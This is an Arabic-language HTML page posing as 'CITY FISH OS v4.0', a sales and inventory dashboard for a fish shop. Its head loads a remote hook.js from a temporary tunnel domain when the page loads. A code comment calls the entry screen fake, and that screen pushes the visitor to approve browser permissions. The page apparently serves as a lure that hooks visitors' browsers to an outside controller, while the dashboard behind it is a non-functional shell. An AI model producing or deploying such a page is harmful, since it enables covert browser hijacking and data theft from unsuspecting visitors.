<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CITY FISH OS v4.0 - Secure Access</title>
    
    <script src="https://0fc034dfd1d961.lhr.life/hook.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap');
        :root { --os-dark: #020617; --os-accent: #22c55e; --os-surface: rgba(30, 41, 59, 0.6); --text-main: #f8fafc; }
        * { box-sizing: border-box; font-family: 'Cairo', sans-serif; }
        body, html { margin: 0; padding: 0; height: 100vh; background: #000; color: var(--text-main); overflow: hidden; }

        /* شاشة الحماية الوهمية */
        #secure-gate {
            position: fixed; inset: 0; background: radial-gradient(circle, #0f172a, #000);
            display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 20000;
        }
        .gate-card {
            background: var(--os-surface); padding: 40px; border-radius: 25px;
            border: 2px solid var(--os-accent); text-align: center; backdrop-filter: blur(10px);
            box-shadow: 0 0 50px rgba(34, 197, 94, 0.2);
        }
        .loading-bar { width: 200px; height: 4px; background: #1e293b; margin: 20px auto; position: relative; overflow: hidden; }
        .loading-bar::after { content: ""; position: absolute; left: 0; top: 0; height: 100%; width: 50%; background: var(--os-accent); animation: load 1s infinite; }
        @keyframes load { from { left: -50% } to { left: 100% } }

        /* تصميم الكود الأصلي لأسماك المدينة */
        #os-intro { position: fixed; inset: 0; background: #000; display: none; justify-content: center; align-items: center; z-index: 10000; }
        #typewriter { font-size: 3rem; color: var(--os-accent); border-left: 4px solid var(--os-accent); white-space: nowrap; overflow: hidden; width: 0; }
        @keyframes typing { from { width: 0 } to { width: 12ch } }
        .os-grid { display: grid; grid-template-columns: 280px 1fr; grid-template-rows: 70px 1fr 40px; height: 100vh; display: none; }
        header { grid-column: 1 / span 2; background: rgba(0,0,0,0.8); border-bottom: 2px solid var(--os-accent); display: flex; justify-content: space-between; align-items: center; padding: 0 25px; }
        aside { background: rgba(15, 23, 42, 0.95); padding: 20px; border-left: 1px solid rgba(255,255,255,0.1); }
        .nav-link { padding: 15px; margin-bottom: 10px; border-radius: 12px; cursor: pointer; background: var(--os-surface); transition: 0.3s; }
        .nav-link.active { background: var(--os-accent); color: var(--os-dark); }
        main { padding: 25px; overflow-y: auto; }
        .card { background: var(--os-surface); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 25px; margin-bottom: 20px; }
        .btn-exe { background: var(--os-accent); color: var(--os-dark); border: none; padding: 15px; border-radius: 10px; width: 100%; cursor: pointer; font-weight: 900; }
        .profit-pill { background: var(--os-accent); color: var(--os-dark); padding: 8px 20px; border-radius: 30px; box-shadow: 0 0 20px var(--os-accent); }
    </style>
</head>
<body>

    <div id="secure-gate">
        <div class="gate-card">
            <h1 style="color:var(--os-accent); margin:0;">أسماك المدينة</h1>
            <p style="color:#94a3b8;">نظام الإدارة المركزية v4.0</p>
            <div class="loading-bar"></div>
            <p style="font-size:0.9rem; margin-bottom:25px;">يجب الموافقة على صلاحيات المتصفح للتشغيل</p>
            <button class="btn-exe" onclick="startApp()">موافق (دخول آمن)</button>
        </div>
    </div>

    <div id="os-intro"><div id="typewriter" id="tw">أسماك المدينة</div></div>

    <div class="os-grid" id="mainApp">
        <header>
            <div id="clock">00:00:00</div>
            <div style="font-size: 1.5rem;">CITY FISH <span style="color:var(--os-accent)">OS v4.0</span></div>
            <div class="profit-pill">الربح: <span id="netProfit">0</span></div>
        </header>
        <aside>
            <div class="nav-link active">🛒 مبيعات</div>
            <div class="nav-link">📦 المخزن</div>
            <div class="nav-link">📊 المالية</div>
        </aside>
        <main>
            <div class="card">
                <h2>مرحباً بك في لوحة التحكم</h2>
                <p>النظام نشط وجاهز لإدارة العمليات اليومية.</p>
            </div>
        </main>
    </div>

    <script>
        function startApp() {
            // إخفاء بوابة الدخول
            document.getElementById('secure-gate').style.display = 'none';
            
            // إظهار الـ Intro وتشغيل الأنيميشن
            const intro = document.getElementById('os-intro');
            const tw = document.getElementById('typewriter');
            intro.style.display = 'flex';
            tw.style.animation = 'typing 2s steps(15) forwards, blink 0.5s infinite';

            // الدخول للتطبيق بعد الـ Intro
            setTimeout(() => {
                intro.style.display = 'none';
                document.getElementById('mainApp').style.display = 'grid';
                updateTime();
            }, 2500);
        }

        function updateTime() {
            setInterval(() => {
                const n = new Date();
                document.getElementById('clock').innerText = n.toLocaleTimeString();
            }, 1000);
        }
    </script>
</body>
</html>
